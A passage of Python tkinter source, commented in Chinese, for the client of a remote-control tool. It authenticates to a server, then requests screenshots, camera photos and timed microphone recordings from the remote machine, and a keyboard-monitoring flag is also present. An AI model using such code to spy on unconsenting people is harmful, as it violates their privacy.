        tk.Label(quick_frame, text="QUICK ACTIONS:", font=FONTS['body'],
                bg=COLORS['bg_lighter'], fg=COLORS['fg_white']).pack(side='left', padx=10)

        actions = [
            ("📸 Screenshot", self.req_screenshot),
            ("📷 Camera", self.req_camera),
            ("🎤 Mic Record", self.req_mic_record),
        ]

        for text, cmd in actions:
            btn = tk.Button(quick_frame, text=text, command=cmd, bg=COLORS['btn_bg'],
                          fg='white', font=FONTS['small'], relief='flat', cursor='hand2')
            btn.pack(side='left', padx=5)

    # ==================== 网络连接逻辑 ====================

    def connect_to_server(self):
        """连接到服务器"""
        ip = self.entry_ip.get()
        pwd = self.entry_pwd.get()

        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5)
            self.sock.connect((ip, SERVER_PORT))

            # 身份验证
            import hashlib
            pwd_hash = hashlib.sha256(pwd.encode()).hexdigest()

            auth_msg = create_auth_message(pwd_hash)
            send_message(self.sock, auth_msg)

            resp = receive_message(self.sock)
            if resp and resp['type'] == MessageType.AUTH_RESPONSE and resp['data']['success']:
                self.is_connected = True
                self.sock.settimeout(None)
                self._init_dashboard_ui()
                self.add_history("Connection", f"Connected to {ip}:{SERVER_PORT}", "Success")
            else:
                messagebox.showerror("Error", "Authentication Failed")
                self.sock.close()

        except Exception as e:
            messagebox.showerror("Connection Error", str(e))

    def disconnect(self):
        """断开连接"""
        self.streaming = False
        self.keyboard_monitoring = False
        if self.sock:
            try:
                send_message(self.sock, create_disconnect_message())
                self.sock.close()
            except:
                pass
        self.destroy()

    # ==================== 快捷操作功能 ====================

    def req_screenshot(self):
        """请求截图"""
        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_screenshot_message())
                    header = receive_message(self.sock)
                    if header and header['type'] == MessageType.SCREENSHOT_DATA:
                        img_data = receive_binary_data(self.sock)
                        if img_data:
                            self.after(0, lambda: self._show_image(img_data, "Screenshot"))
                            self.add_history("Screenshot", "Captured screenshot", "Success")
            except Exception as e:
                print(f"Screenshot error: {e}")
        threading.Thread(target=_thread, daemon=True).start()

    def req_camera(self):
        """请求摄像头拍照"""
        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_camera_message())
                    header = receive_message(self.sock)
                    if header and header['type'] == MessageType.CAMERA_DATA:
                        if header['data']['success']:
                            img_data = receive_binary_data(self.sock)
                            self.after(0, lambda: self._show_image(img_data, "Camera Photo"))
                            self.add_history("Camera", "Captured camera photo", "Success")
            except Exception as e:
                print(f"Camera error: {e}")
        threading.Thread(target=_thread, daemon=True).start()

    def req_mic_record(self):
        """请求麦克风录音"""
        duration = simpledialog.askinteger("Microphone", "Recording duration (seconds):",
                                          initialvalue=5, minvalue=1, maxvalue=60)
        if duration:
            def _thread():
                try:
                    with self.sock_lock:
                        send_message(self.sock, create_mic_record_message(duration=duration))
                        header = receive_message(self.sock)
                        if header and header['type'] == MessageType.MIC_RECORD_RESPONSE:
                            if header['data']['success']:
                                audio_data = receive_binary_data(self.sock)
                                save_path = filedialog.asksaveasfilename(defaultextension=".wav",
                                                                         filetypes=[("WAV files", "*.wav")])
                                if save_path:
                                    with open(save_path, 'wb') as f:
                                        f.write(audio_data)
                                    self.after(0, lambda: messagebox.showinfo("Success", f"Audio saved to {save_path}"))
                                    self.add_history("Microphone", f"Recorded {duration}s audio", "Success")
                except Exception as e:
                    print(f"Mic record error: {e}")
            threading.Thread(target=_thread, daemon=True).start()

    def _show_image(self, img_data, title="Image"):
        """显示图片"""
        top = tk.Toplevel(self)
        top.title(title)
        top.configure(bg='black')

        img = Image.open(io.BytesIO(img_data))
        img.thumbnail((1280, 720))
        photo = ImageTk.PhotoImage(img)

        lbl = tk.Label(top, image=photo, bg='black')
        lbl.image = photo
        lbl.pack()

    # ==================== 操作历史功能 ====================

    def add_history(self, action, details, status):
        """添加操作历史记录"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.history_tree.insert('', 0, values=(timestamp, action, details, status))
        except:
            pass

    def clear_history(self):
        """清空历史记录"""
        if messagebox.askyesno("Confirm", "Clear all history?"):
            for item in self.history_tree.get_children():
                self.history_tree.delete(item)

    def export_history(self):
        """导出历史记录"""
        save_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                                filetypes=[("Text files", "*.txt"), ("CSV files", "*.csv")])
        if save_path:
            with open(save_path, 'w') as f:
                f.write("Operation History Export\n")
                f.write("="*80 + "\n\n")
                for item in self.history_tree.get_children():
                    values = self.history_tree.item(item)['values']
                    f.write(f"{values[0]} | {values[1]} | {values[2]} | {values[3]}\n")
            messagebox.showinfo("Success", f"History exported to {save_path}")


if __name__ == "__main__":
    app = VisualClientUI()
    app.mainloop()
